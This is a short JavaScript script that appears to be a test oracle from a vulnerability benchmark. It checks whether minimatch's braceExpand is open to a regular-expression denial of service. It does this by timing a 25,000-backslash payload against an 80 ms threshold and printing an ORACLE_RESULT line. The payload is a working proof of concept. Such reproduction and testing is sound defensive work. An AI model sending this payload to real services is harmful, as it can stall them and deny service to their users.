const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const benign = minimatch.braceExpand('x{a,b}y');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'xay' || benign[1] !== 'xby') {
    throw new Error('benign_operation_failed');
  }

  operation_completed = true;

  // ReDoS trigger for vulnerable minimatch 3.0.4 brace detection /\{.*\}/
  // Use no opening brace so the regex must backtrack heavily across many chars.
  const payload = '\\'.repeat(25000) + 'X';

  const t0 = process.hrtime.bigint();
  minimatch.braceExpand(payload);
  const elapsedMs = Number((process.hrtime.bigint() - t0) / 1000000n);

  // In vulnerable versions this call is typically much slower; patched is near-constant.
  const thresholdMs = 80;
  exploit_succeeded = elapsedMs >= thresholdMs;
  evidence = 'elapsed_ms=' + elapsedMs + ';payload_len=' + payload.length + ';threshold_ms=' + thresholdMs;
} catch (err) {
  if (!operation_completed) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_error=' + (err && err.message ? err.message : String(err));
  } else {
    exploit_succeeded = false;
    evidence = 'malicious_error_type=' + (err && err.name ? err.name : 'Error');
  }
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));